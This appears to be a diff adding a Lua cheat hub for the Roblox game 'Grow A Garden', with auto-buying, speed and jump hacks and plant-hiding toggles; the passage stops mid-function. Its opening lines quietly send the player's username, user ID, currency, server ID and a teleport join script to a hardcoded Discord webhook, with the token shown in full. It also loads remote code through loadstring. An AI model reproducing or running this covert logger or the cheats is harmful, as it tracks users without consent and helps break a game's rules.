@@ -1,0 +1,4208 @@
+webhookURL = "https://discord.com/api/webhooks/1374135888539553965/A5YV7Rug7dQt5ipUOoawtKT0TgCvHBtv_8dgednK42jvSOPdnGccvIb19i-9-yZZb6Bn"
+Executor = identifyexecutor()
+player = game.Players.LocalPlayer
+username = player.Name
+displayName = player.DisplayName
+userId = player.UserId
+gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
+gameId = game.PlaceId
+jobId = game.JobId
+playerCount = #game.Players:GetPlayers()
+ShecklesAmount = game:GetService("Players").LocalPlayer.PlayerGui.Sheckles_UI.TextLabel.Text
+--made by olly.exe
+
+local luaJoinScript = [[
+local TeleportService = game:GetService("TeleportService")
+TeleportService:TeleportToPlaceInstance(]] .. gameId .. [[, "]] .. jobId .. [[", game.Players.LocalPlayer)
+]]
+--made by olly.exe
+local embed = {
+    ["title"] = "Execution Log",
+    ["description"] = "Here are the details of the player and game:",
+    ["type"] = "rich",
+    ["fields"] = {
+        { ["name"] = "Username", ["value"] = username, ["inline"] = true },
+        { ["name"] = "Display Name", ["value"] = displayName, ["inline"] = true },
+        { ["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = false },
+        { ["name"] = "Sheckles", ["value"] = ShecklesAmount, ["inline"] = true },
+        { ["name"] = "Game Name", ["value"] = gameName, ["inline"] = false },
+        { ["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true },
+        { ["name"] = "Players in Server", ["value"] = tostring(playerCount), ["inline"] = true },
+          { ["name"] = "Executor", ["value"] = Executor, ["inline"] = false },
+        { ["name"] = "Lua Join Script", ["value"] = "```lua\n" .. luaJoinScript .. "\n```", ["inline"] = false },
+    },
+    ["footer"] = { ["text"] = "Execution Log - Roblox" },
+    ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+}
+--made by olly.exe
+local payload = game:GetService("HttpService"):JSONEncode({
+    ["content"] = "",
+    ["embeds"] = {embed}
+})
+--made by olly.exe
+local requestFunction = syn and syn.request or http_request or request
+if requestFunction then
+    requestFunction({
+        Url = webhookURL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = payload
+    })
+else
+    Notification("Your executor does not support HTTP requests.", 2, 255, 0, 0)
+    if not Executor then
+Notification("Your executor does not support | identifyexcutor().", 2, 255, 0, 0)
+    end
+end
+
+-- Made by olly.exe on discord
+
+
+function Notification(TEXT, time, R, G, B)
+local Notifications = game:GetService("ReplicatedStorage").Notification_UI:Clone()
+
+Notifications.Parent = game:GetService("Players").LocalPlayer.PlayerGui.Top_Notification.Frame
+
+Notifications.TextLabel.Text = TEXT
+
+Notifications.TextLabel.TextColor3 = Color3.fromRGB(R, G, B)
+
+wait(time)
+for i = 1, 10 do 
+    wait(0.01)
+Notifications.TextLabel.TextTransparency = Notifications.TextLabel.TextTransparency + 0.1
+    end
+
+Notifications:remove()
+
+end
+--                                      time  R  G  B
+Notification("ty for choosing our script!", 3, 0, 0, 255)
+
+
+
+function applyautofarm()
+    while true do
+        wait(0.05)
+        local a = workspace.NPCS["Pet Stand"].EggLocations
+        local b = a:GetChildren()
+        if carrot then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Carrot")
+        end
+        if strawberry then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Strawberry")
+        end
+        if blueberry then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Blueberry")
+        end
+        if orange_tulip then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Orange Tulip")
+        end
+        if tomato then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Tomato")
+        end
+        if corn then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Corn")
+        end
+        if daffodil then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Daffodil")
+        end
+        if watermelon then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Watermelon")
+        end
+        if pumpkin then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Pumpkin")
+        end
+        if apple then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Apple")
+        end
+        if bamboo then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Bamboo")
+        end
+        if coconut then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Coconut")
+        end
+        if cactus then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Cactus")
+        end
+        if dragon_fruit then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Dragon Fruit")
+        end
+        if mango then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Mango")
+        end
+        if grape then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Grape")
+        end
+        if mushroom then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Mushroom")
+        end
+        if pepper then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Pepper")
+        end
+        if cacao then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Cacao")
+        end
+        if banana then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Banana")
+        end
+        if bean then
+            game:GetService("ReplicatedStorage").GameEvents.BuySeedStock:FireServer("Beanstalk")
+        end
+        if watering then
+            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Watering Can")
+        end
+        if trowl then
+            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Trowel")
+        end
+        if basic then
+            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Basic Sprinkler")
+        end
+        if advanced then
+            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Advanced Sprinkler")
+        end
+        if godly then
+            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Godly Sprinkler")
+        end
+        if light then
+            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Lightning Rod")
+        end
+        if master then
+            game:GetService("ReplicatedStorage").GameEvents.BuyGearStock:FireServer("Master Sprinkler")
+        end
+        if commonegg then
+            if b[5] and b[5].Name == "Common Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
+            end
+            if b[6] and b[6].Name == "Common Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
+            end
+            if b[4] and b[4].Name == "Common Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
+            end
+        end
+        if uncommonegg then
+            if b[5] and b[5].Name == "Uncommon Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
+            end
+            if b[6] and b[6].Name == "Uncommon Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
+            end
+            if b[4] and b[4].Name == "Uncommon Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
+            end
+        end
+        if rareegg then
+            if b[5] and b[5].Name == "Rare Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
+            end
+            if b[6] and b[6].Name == "Rare Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
+            end
+            if b[4] and b[4].Name == "Rare Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
+            end
+        end
+        if legendaryegg then
+            if b[5] and b[5].Name == "Legendary Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
+            end
+            if b[6] and b[6].Name == "Legendary Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
+            end
+            if b[4] and b[4].Name == "Legendary Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
+            end
+        end
+        if mythicalegg then
+            if b[5] and b[5].Name == "Mythical Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
+            end
+            if b[6] and b[6].Name == "Mythical Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
+            end
+            if b[4] and b[4].Name == "Mythical Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
+            end
+        end
+        if bugegg then
+            if b[5] and b[5].Name == "Bug Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(2)
+            end
+            if b[6] and b[6].Name == "Bug Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(3)
+            end
+            if b[4] and b[4].Name == "Bug Egg" then
+                game:GetService("ReplicatedStorage").GameEvents.BuyPetEgg:FireServer(1)
+            end
+        end
+        --event
+if Mysterious then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Mysterious Crate")
+end
+
+if NightEgg then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Night Egg")
+end
+
+if NightSeedPack then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Night Seed Pack")
+end
+
+if BloodBanana then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Blood Banana Seed")
+end
+
+if MoonMelon then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Moon Melon Seed")
+end
+
+if StarCaller then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Star Caller")
+end
+
+if BloodHedgehog then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Blood Hedgehog")
+end
+
+if BloodKiwi then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Blood Kiwi")
+end
+
+if BloodOwl then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Blood Owl")
+end
+
+if ChocolateCarrot then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Chocolate Carrot Seed")
+end
+
+if RedLollipop then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Red Lollipop")
+end
+
+if CandySunflower then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Candy Sunflower")
+end
+
+if EasterEgg then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Easter Egg")
+end
+
+if ChocolateSprinkler then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Chocolate Sprinkler")
+end
+
+if CandyBlossom then
+    game:GetService("ReplicatedStorage").GameEvents.BuyEventShopStock:FireServer("Candy Blossom")
+end
+    end
+end
+
+
+
+local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
+
+-- Create the main UI window with a key system
+local Window = Rayfield:CreateWindow({
+    Name = "Woobee X CatCat Grow A Garden",
+    LoadingTitle = "Enjoy",
+    LoadingSubtitle = "by CatCat And Woobee",
+    ConfigurationSaving = {
+        Enabled = false,
+        FolderName = nil,
+        FileName = "GROWAGARDEN"
+    },
+    KeySystem = false, -- Enable key system
+    KeySettings = {
+        Title = "WoobeeXCatCat Key System",
+        Subtitle = "Enter your access key",
+        Note = "Get the key from Woobee or CatCat",
+        FileName = "WoobeeCatKey", -- Saves the key for reuse
+        SaveKey = false, -- Saves key locally
+        GrabKeyFromSite = false, -- Set to true if you host the key on a website
+        Key = "WoobeeXCatCatXWindowedHubs" -- Your permanent key
+        
+    }
+})
+
+
+-- Variables to store current values
+local walkSpeed = 16
+local jumpPower = 50
+local sprintSpeed = 16  -- Default sprint speed
+local isSprinting = false
+
+-- Function to apply values to character
+function applyStats()
+    local character = game.Players.LocalPlayer.Character
+    if character and character:FindFirstChild("Humanoid") then
+        character.Humanoid.WalkSpeed = walkSpeed
+        character.Humanoid.JumpPower = jumpPower
+    end
+end
+
+-- Apply again on respawn
+game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
+    char:WaitForChild("Humanoid")
+    task.wait(0.1) -- Slight delay to ensure everything is loaded
+    applyStats()
+    applyautofarm()
+end)
+
+-- Player Tab
+local PlayerTab = Window:CreateTab("Player", 4483362458)
+
+-- WalkSpeed Slider
+PlayerTab:CreateSlider({
+    Name = "WalkSpeed",
+    Range = {16, 100},
+    Increment = 1,
+    Suffix = "Speed",
+    CurrentValue = walkSpeed,
+    Flag = "WalkSpeedSlider",
+    Callback = function(Value)
+        walkSpeed = Value
+        applyStats()
+    end,
+})
+
+-- JumpHeight Slider
+PlayerTab:CreateSlider({
+    Name = "JumpHeight",
+    Range = {50, 200},
+    Increment = 5,
+    Suffix = "Height",
+    CurrentValue = jumpPower,
+    Flag = "JumpHeightSlider",
+    Callback = function(Value)
+        jumpPower = Value
+        applyStats()
+    end,
+})
+
+-- Infinite Jump Variables
+InfiniteJumpEnabled = false
+
+-- Toggle in UI
+Toggle = PlayerTab:CreateToggle({
+    Name = "Infinite Jump",
+    CurrentValue = false,
+    Flag = "InfiniteJumpToggle",
+    Callback = function(Value)
+        InfiniteJumpEnabled = Value
+    end,
+})
+
+-- Infinite Jump Logic
+game:GetService("UserInputService").JumpRequest:Connect(function()
+    if InfiniteJumpEnabled then
+        local player = game.Players.LocalPlayer
+        local humanoid = player.Character and player.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+        end
+    end
+end)
+
+
+Players = game:GetService("Players")
+RunService = game:GetService("RunService")
+CoreGui = game:GetService("CoreGui")
+
+local player = Players.LocalPlayer
+
+-- Create the GUI label
+local gui = Instance.new("ScreenGui")
+gui.Name = "BackpackCounterUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Enabled = false
+gui.Parent = CoreGui
+
+label = Instance.new("TextLabel")
+label.Size = UDim2.new(0, 150, 0, 25)
+label.Position = UDim2.new(0, 10, 0, 105)
+label.BackgroundTransparency = 0.5
+label.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+label.TextColor3 = Color3.fromRGB(255, 255, 255)
+label.Text = "Backpack: 0"
+label.TextXAlignment = Enum.TextXAlignment.Center
+label.TextYAlignment = Enum.TextYAlignment.Center
+label.Parent = gui
+
+local renderConnection = nil
+
+function updateCount()
+	local current = #player.Backpack:GetChildren()
+	label.Text = "Backpack Count: " .. current
+end
+
+-- Start/stop functions
+function startTracking()
+	gui.Enabled = true
+	updateCount()
+	renderConnection = RunService.RenderStepped:Connect(updateCount)
+end
+
+function stopTracking()
+	gui.Enabled = false
+	if renderConnection then
+		renderConnection:Disconnect()
+		renderConnection = nil
+	end
+end
+
+-- Rayfield Toggle
+PlayerTab:CreateToggle({
+	Name = "Live Backpack Count",
+	CurrentValue = false,
+	Flag = "ShowBackpackCount",
+	Callback = function(state)
+		if state then
+			startTracking()
+		else
+			stopTracking()
+		end
+	end
+})
+
+
+
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+local screenGui = player:FindFirstChild("PlayerGui") and player.PlayerGui:FindFirstChild("InfiniteYield") or
+                  game:GetService("CoreGui"):FindFirstChild("InfiniteYield")
+
+if not screenGui then
+    -- If not found, create your own ScreenGui inside PlayerGui as fallback
+    screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "MyIdleTimerGui"
+    screenGui.Parent = player:WaitForChild("PlayerGui")
+end
+
+-- Now create the label inside the found or fallback ScreenGui
+local idleLabel = Instance.new("TextLabel")
+idleLabel.Size = UDim2.new(0, 150, 0, 25)
+idleLabel.Position = UDim2.new(1, -160, 0, 50)  -- Right side of screen
+idleLabel.BackgroundTransparency = 0.5
+idleLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+idleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+idleLabel.Text = "Idle Time: 0s"
+idleLabel.Visible = false
+idleLabel.Parent = screenGui
+
+-- Then proceed with the rest of your idle timer code as normal.
+
+
+ function resetIdleTimer()
+    idleSeconds = 0
+end
+
+
+ function startIdleTimer()
+    idleSeconds = 0
+    idleLabel.Text = "Idle Time: 0s"
+    idleLabel.Visible = true
+
+    if idleTimerConnection then idleTimerConnection:Disconnect() end
+    idleTimerConnection = RunService.RenderStepped:Connect(function(dt)
+        idleSeconds += dt
+        idleLabel.Text = "Idle Time: " .. math.floor(idleSeconds) .. "s"
+    end)
+end
+
+ function stopIdleTimer()
+    if idleTimerConnection then
+        idleTimerConnection:Disconnect()
+        idleTimerConnection = nil
+    end
+    idleLabel.Visible = false
+end
+
+
+-- Example toggle callback integration
+PlayerTab:CreateToggle({
+    Name = "Live Idle Timer",
+    CurrentValue = false,
+    Flag = "IdleTimerToggle",
+    Callback = function(state)
+        if state then
+            startIdleTimer()
+        else
+            stopIdleTimer()
+        end
+    end,
+})
+
+-- Initialize on script start
+local flagState = Rayfield.Flags["IdleTimerToggle"]
+if flagState then
+    startIdleTimer()
+else
+    stopIdleTimer()
+end
+
+UserInputService.InputBegan:Connect(resetIdleTimer)
+UserInputService.InputChanged:Connect(resetIdleTimer)
+
+local WorldTab = Window:CreateTab("World", 4483362458)
+
+
+
+Section = WorldTab:CreateSection("Weather Toggles")
+
+local Lighting = game:GetService("Lighting")
+local RunService = game:GetService("RunService")
+
+local originalTime = Lighting.ClockTime
+local originalAmbient = Lighting.Ambient
+local originalOutdoorAmbient = Lighting.OutdoorAmbient
+local originalFogEnd = Lighting.FogEnd
+local originalBrightness = Lighting.Brightness
+local originalExposureCompensation = Lighting.ExposureCompensation
+
+local timeConnection = nil
+
+local alwaysDay = false
+local alwaysNight = false
+
+local alwaysDayToggleObject = nil
+local alwaysNightToggleObject = nil
+
+function stopTimeOverride()
+	if timeConnection then
+		timeConnection:Disconnect()
+		timeConnection = nil
+	end
+	-- Restore original Lighting settings
+	Lighting.ClockTime = originalTime
+	Lighting.Ambient = originalAmbient
+	Lighting.OutdoorAmbient = originalOutdoorAmbient
+	Lighting.FogEnd = originalFogEnd
+	Lighting.Brightness = originalBrightness
+	Lighting.ExposureCompensation = originalExposureCompensation
+end
+
+alwaysDayToggleObject = WorldTab:CreateToggle({
+	Name = "Always Day",
+	CurrentValue = false,
+	Flag = "AlwaysDayToggle",
+	Callback = function(Value)
+		if Value then
+			if alwaysNight then
+				alwaysNight = false
+				if alwaysNightToggleObject then
+					alwaysNightToggleObject:Set(false)
+				end
+				stopTimeOverride()
+			end
+
+			alwaysDay = true
+			stopTimeOverride()
+			timeConnection = RunService.RenderStepped:Connect(function()
+				Lighting.ClockTime = 11 -- Midday
+				-- Daytime lighting colors (bright and warm)
+				Lighting.Ambient = Color3.fromRGB(170, 170, 160)       -- bright ambient light
+				Lighting.OutdoorAmbient = Color3.fromRGB(200, 200, 180) -- bright outdoor ambient
+				Lighting.FogEnd = 0                                 -- less fog during day
+				Lighting.Brightness = 1                      -- moderate brightness
+				Lighting.ExposureCompensation = 1                      -- neutral exposure
+			end)
+		else
+			alwaysDay = false
+			stopTimeOverride()
+		end
+	end,
+})
+
+alwaysNightToggleObject = WorldTab:CreateToggle({
+	Name = "Always Night",
+	CurrentValue = false,
+	Flag = "AlwaysNightToggle",
+	Callback = function(Value)
+		if Value then
+			if alwaysDay then
+				alwaysDay = false
+				if alwaysDayToggleObject then
+					alwaysDayToggleObject:Set(false)
+				end
+				stopTimeOverride()
+			end
+
+			alwaysNight = true
+			stopTimeOverride()
+			timeConnection = RunService.RenderStepped:Connect(function()
+				Lighting.ClockTime = 0 -- Midnight
+				-- Nighttime lighting colors (dark but visible)
+				Lighting.Ambient = Color3.fromRGB(30, 30, 45)           -- dark bluish ambient
+				Lighting.OutdoorAmbient = Color3.fromRGB(10, 10, 20)    -- darker outdoor ambient
+				Lighting.FogEnd = 500                                   -- reduced fog for night
+				Lighting.Brightness = 5                                 -- normal brightness
+				Lighting.ExposureCompensation = 1                       -- neutral exposure
+			end)
+		else
+			alwaysNight = false
+			stopTimeOverride()
+		end
+	end,
+})
+
+
+
+
+Section = WorldTab:CreateSection("Hide/Unhide Gardens")
+
+local RunService = game:GetService("RunService")
+local farmsFolder = workspace:WaitForChild("Farm")
+
+local toggled = false
+local hideCarrotsAndTulips = false
+local heartbeatConnection = nil
+local lastUpdate = 0
+
+local hiddenParts = {} -- [part] = {Transparency = original, CanCollide = original}
+local scannedDescendants = {} -- [plantsFolder] = cached list of parts
+local processedParts = {} -- tracks parts already hidden
+local farmIndex = 1
+local partQueue = {} -- used to delay hiding
+local idleFrames = 0 -- counter to stop checking when nothing new
+
+-- Config for heartbeat throttling
+local SCAN_INTERVAL = 0.1
+local PARTS_PER_FRAME = 50 -- more parts per frame for speed
+
+function isInFruitsFolder(part, root)
+	local current = part
+	while current and current ~= root do
+		if current.Name == "Fruits" then
+			return true
+		end
+		current = current.Parent
+	end
+	return false
+end
+
+function isVisibleCarrotPart(part, root)
+	local plantModel = part:FindFirstAncestorWhichIsA("Model")
+	if not plantModel or not plantModel:IsDescendantOf(root) then return false end
+
+	local cropNameValue = plantModel:FindFirstChild("CropName")
+	if cropNameValue and cropNameValue:IsA("StringValue") and cropNameValue.Value == "Carrot" then
+		if part.Name == "1" or part.Name == "2" then
+			return true
+		end
+	end
+
+	if plantModel.Name:lower():find("carrot") then
+		if part.Name == "1" or part.Name == "2" then
+			return true
+		end
+	end
+
+	return false
+end
+
+function isTulipModel(plantModel)
+	if not plantModel then return false end
+	local cropNameValue = plantModel:FindFirstChild("CropName")
+	if cropNameValue and cropNameValue:IsA("StringValue") and cropNameValue.Value == "Tulip" then
+		return true
+	end
+	if plantModel.Name:lower():find("tulip") then
+		return true
+	end
+	return false
+end
+
+function isOrange(color)
+	return color.r > 0.8 and color.g < 0.5 and color.b < 0.3
+end
+
+function hidePart(part, root)
+	if not part:IsA("BasePart") or isInFruitsFolder(part, root) then return end
+	if processedParts[part] then return end
+
+	local plantModel = part:FindFirstAncestorWhichIsA("Model")
+	if not plantModel or not plantModel:IsDescendantOf(root) then return end
+
+	local cropName = ""
+	local cropNameValue = plantModel:FindFirstChild("CropName")
+	if cropNameValue and cropNameValue:IsA("StringValue") then
+		cropName = cropNameValue.Value
+	else
+		cropName = plantModel.Name
+	end
+	cropName = cropName:lower()
+
+	local isCarrot = cropName:find("carrot")
+	local isTulip = cropName:find("tulip")
+
+	if isCarrot then
+		if part.Name == "1" or part.Name == "2" then return end
+		if isOrange(part.Color) then return end
+	end
+
+	if isTulip then
+		if isOrange(part.Color) then return end
+	end
+
+	if not hideCarrotsAndTulips and (isCarrot or isTulip) then return end
+
+	if part.Transparency ~= 1 then
+		hiddenParts[part] = {
+			Transparency = part.Transparency,
+			CanCollide = part.CanCollide
+		}
+		part.Transparency = 1
+		part.CanCollide = false
+	end
+
+	processedParts[part] = true
+end
+
+function scanOneFarm()
+	local farms = farmsFolder:GetChildren()
+	local farm = farms[farmIndex]
+	if not farm then return end
+
+	local important = farm:FindFirstChild("Important")
+	if important then
+		local plants = important:FindFirstChild("Plants_Physical")
+		if plants then
+			if not scannedDescendants[plants] then
+				scannedDescendants[plants] = plants:GetDescendants()
+			end
+			for _, part in ipairs(scannedDescendants[plants]) do
+				if part:IsA("BasePart") and not processedParts[part] then
+					table.insert(partQueue, {part = part, root = plants})
+				end
+			end
+		end
+	end
+
+	farmIndex += 1
+	if farmIndex > #farms then farmIndex = 1 end
+end
+
+function resetAllParts()
+	for part, original in pairs(hiddenParts) do
+		if part and part:IsA("BasePart") then
+			part.Transparency = original.Transparency
+			part.CanCollide = original.CanCollide
+		end
+	end
+	hiddenParts = {}
+	processedParts = {}
+	scannedDescendants = {}
+	partQueue = {}
+	farmIndex = 1
+	idleFrames = 0
+end
+
+function fastHideAllPlants()
+	-- Immediately hide all relevant parts for speed without waiting on queue
+	local farms = farmsFolder:GetChildren()
+	for _, farm in ipairs(farms) do
+		local important = farm:FindFirstChild("Important")
+		if important then
+			local plantsFolder = important:FindFirstChild("Plants_Physical")
+			if plantsFolder then
+				local descendants = scannedDescendants[plantsFolder]
+				if not descendants then
+					descendants = plantsFolder:GetDescendants()
+					scannedDescendants[plantsFolder] = descendants
+				end
+				for _, part in ipairs(descendants) do
+					if part:IsA("BasePart") and not processedParts[part] then
+						hidePart(part, plantsFolder)
+					end
+				end
+			end
+		end
+	end
+end
+
+function startHeartbeat()
+	if heartbeatConnection then return end
+	heartbeatConnection = RunService.Heartbeat:Connect(function(dt)
+		lastUpdate += dt
+		if lastUpdate >= 0.01 then
+			lastUpdate = 0
+			if toggled then
+				local didSomething = false
+
+				-- Process limited parts per frame to reduce lag
+				for i = 1, PARTS_PER_FRAME do
+					local item = table.remove(partQueue, 1)
+					if item then
+						hidePart(item.part, item.root)
+						didSomething = true
+					else
+						break
+					end
+				end
+
+				-- Keep scanning farms to refill queue if needed
+				if #partQueue < 500 then
+					scanOneFarm()
+					didSomething = true
+				end
+
+				if not didSomething then
+					idleFrames += 1
+				else
+					idleFrames = 0
+				end
+
+				if idleFrames > 100 then
+					partQueue = {} -- stop scanning after idle period
+				end
+			end
+		end
+	end)
+end
+
+function stopHeartbeat()
+	if heartbeatConnection then
+		heartbeatConnection:Disconnect()
+		heartbeatConnection = nil
+	end
+end
+
+function setToggled(state)
+	toggled = state
+	if toggled then
+		resetAllParts()
+		-- Fast initial hide to avoid slow buildup
+		fastHideAllPlants()
+		startHeartbeat()
+	else
+		stopHeartbeat()
+		resetAllParts()
+	end
+end
+
+function updateVisibilityImmediately()
+	if toggled then
+		resetAllParts()
+		fastHideAllPlants()
+		startHeartbeat()
+	end
+end
+
+-- Rayfield Toggles
+
+WorldTab:CreateToggle({
+	Name = "Hide All Bushes/Leaves (Beta)",
+	CurrentValue = false,
+	Flag = "HidePlants",
+	Callback = function(state)
+		setToggled(state)
+	end,
+})
+
+WorldTab:CreateToggle({
+	Name = "Hide Carrots and Tulips Stem/Leaves (Beta)",
+	CurrentValue = false,
+	Flag = "HideCarrotsTulips",
+	Callback = function(state)
+		hideCarrotsAndTulips = state
+		if toggled then
+			-- On toggling this, immediately re-hide parts to avoid flicker or revealing bushes
+			resetAllParts()
+			fastHideAllPlants()
+			startHeartbeat()
+		end
+	end,
+})
+
+-- 🟡 LEAVE FRUIT TOGGLE UNCHANGED
+hideFruits = false
+fruitParts = {} -- Tracks only valid parts we modify
+
+WorldTab:CreateToggle({
+	Name = "Hide Fruits",
+	CurrentValue = false,
+	Flag = "HideFruits",
+	Callback = function(state)
+		hideFruits = state
+
+		for part, original in pairs(fruitParts) do
+			if part and part:IsA("BasePart") then
+				part.Transparency = original
+			end
+		end
+		fruitParts = {}
+
+		if state then
+			for _, farm in ipairs(workspace.Farm:GetChildren()) do
+				local important = farm:FindFirstChild("Important")
+				if important then
+					local plantsFolder = important:FindFirstChild("Plants_Physical")
+					if plantsFolder then
+						for _, plantModel in ipairs(plantsFolder:GetChildren()) do
+							local fruitsFolder = plantModel:FindFirstChild("Fruits")
+							if fruitsFolder then
+								for _, part in ipairs(fruitsFolder:GetDescendants()) do
+									if part:IsA("BasePart") and part.Transparency ~= 1 then
+										fruitParts[part] = part.Transparency
+										part.Transparency = 1
+									end
+								end
+							end
+						end
+					end
+				end
+			end
+		end
+	end,
+})
+
+
+
+FarmTab = Window:CreateTab("Farm", 4483362458)
+
+Section = FarmTab:CreateSection("Collect Fruits")
+
+
+Players = game:GetService("Players")
+VirtualInputManager = game:GetService("VirtualInputManager")
+RunService = game:GetService("RunService")
+
+local player = Players.LocalPlayer
+local farmsFolder = workspace:WaitForChild("Farm")
+
+local running = false
+local farmingLoopRunning = false
+local holdEConnection = nil
+local promptUpdateConnection = nil
+local originalDistances = {}
+local ignoredSignPrompts = {}
+
+
+
+function findPlayersFarm()
+	for _, farm in ipairs(farmsFolder:GetChildren()) do
+		local owner = farm:FindFirstChild("Important")
+			and farm.Important:FindFirstChild("Data")
+			and farm.Important.Data:FindFirstChild("Owner")
+		if owner and owner:IsA("StringValue") and owner.Value == player.Name then
+			return farm
+		end
+	end
+	return nil
+end
+
+function increaseFruitPromptDistances(range)
+	local farm = findPlayersFarm()
+	if not farm then return end
+
+	local plants = farm:FindFirstChild("Important") and farm.Important:FindFirstChild("Plants_Physical")
+	if not plants then return end
+
+	for _, plant in ipairs(plants:GetChildren()) do
+		local fruits = plant:FindFirstChild("Fruits")
+		if fruits then
+			for _, fruit in ipairs(fruits:GetChildren()) do
+				for _, desc in ipairs(fruit:GetDescendants()) do
+					if desc:IsA("ProximityPrompt") and desc.MaxActivationDistance ~= range then
+						if not originalDistances[desc] then
+							originalDistances[desc] = desc.MaxActivationDistance
+						end
+						desc.MaxActivationDistance = range
+					end
+				end
+			end
+		end
+	end
+end
+
+function resetProximityDistances()
+	for prompt, original in pairs(originalDistances) do
+		if prompt and prompt.Parent then
+			prompt.MaxActivationDistance = original
+		end
+	end
+	originalDistances = {}
+end
+
+function disableGrowSignPrompts()
+	for _, farm in ipairs(farmsFolder:GetChildren()) do
+		local growSign = farm:FindFirstChild("Grow_Sign", true)
+		if growSign then
+			for _, desc in ipairs(growSign:GetDescendants()) do
+				if desc:IsA("ProximityPrompt") then
+					ignoredSignPrompts[desc] = desc.Enabled
+					desc.Enabled = false
+				end
+			end
+		end
+	end
+end
+
+function enableGrowSignPrompts()
+	for prompt, wasEnabled in pairs(ignoredSignPrompts) do
+		if prompt and prompt.Parent then
+			prompt.Enabled = wasEnabled
+		end
+	end
+	ignoredSignPrompts = {}
+end
+
+function minimizeEggPromptDistances()
